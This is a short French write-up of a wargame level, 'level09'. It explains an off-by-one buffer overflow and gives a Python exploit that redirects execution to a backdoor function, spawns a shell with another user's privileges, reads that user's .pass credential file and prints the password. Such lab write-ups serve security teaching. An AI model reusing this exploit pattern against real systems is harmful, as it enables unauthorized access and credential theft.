
le niveau 09 est relativement simple, une structure est depose sur la stack, elle est remplie succesivement du nom de l'user puis d'un message
la faille vient d'une erreur du programmeur, en faisant un <= plutot qu'un <, en remplissant l'user on peux overflow pour ecrire plus que necessaire dans le message

on ciblera l'eip permettant a handle_msg de revenir correctement au main pour changer l'execution du programme sur secret_backdoor qui lit sur l'entree standart la commande a exec,
dans notre cas on demandera un shell.

$ cat /tmp/9/code.py
import struct
import sys

end = "\n"
username = "U" * 0x28

message = "M" * 0x8c
padding = "m" * 0x3c
secret = "\x8c\x48\x55\x55\x55\x55\x00\x00"

	message_length = struct.pack("<L", (len(message) + len(padding) + len(secret)))

sys.stdout.write(username + message_length + end)

sys.stdout.write(message + padding + secret + end)

sys.stdout.write("/bin/sh" + end)

$ (python /tmp/9/code.py; cat - ) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU�>: Msg @Unix-Dude
>>: >: Msg sent!
id
uid=1010(level09) gid=1010(level09) euid=1009(end) egid=100(users) groups=1009(end),100(users),1010(level09)
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE

pour debugger a l'aider de gdb: ( ce dernier ajoute un newline automiquement  ce qui pause des problemes )
$ python code.py > /tmp/9/f ; xxd /tmp/9/f
gdb: run < /tmp/9/f


